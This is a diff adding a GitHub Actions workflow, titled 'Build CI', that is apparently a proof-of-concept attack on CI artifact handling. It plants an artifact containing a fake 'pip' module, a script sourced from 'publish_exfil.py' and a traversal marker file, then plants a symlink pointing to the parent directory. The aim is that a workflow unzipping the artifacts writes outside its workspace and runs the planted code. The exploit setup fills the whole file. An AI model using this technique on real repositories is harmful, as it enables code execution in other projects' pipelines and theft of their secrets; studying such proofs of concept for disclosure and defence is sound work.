@@ -1,0 +1,34 @@
+name: Build CI
+
+on:
+  push:
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    name: Build
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: plant payload artifact
+        uses: ./poc/plant
+        with:
+          name: "p"
+          entries: |
+            [
+              {"name":"pip/__init__.py","content":"","mode":33188},
+              {"name":"pip/__main__.py","file":"poc/pip_main.py","mode":33188},
+              {"name":"poc_publish.py","file":"poc/publish_exfil.py","mode":33188},
+              {"name":"PWNED_TRAVERSAL.txt","content":"symlink unzip traversal reached the workspace root\n","mode":33188}
+            ]
+      - name: plant symlink artifact
+        uses: ./poc/plant
+        with:
+          name: "."
+          entries: '[{"name":"p","content":"..","mode":41471}]'
+      - name: list artifacts
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh api "repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/artifacts" --jq '.artifacts[] | "ID=\(.id) NAME=[\(.name)]"'
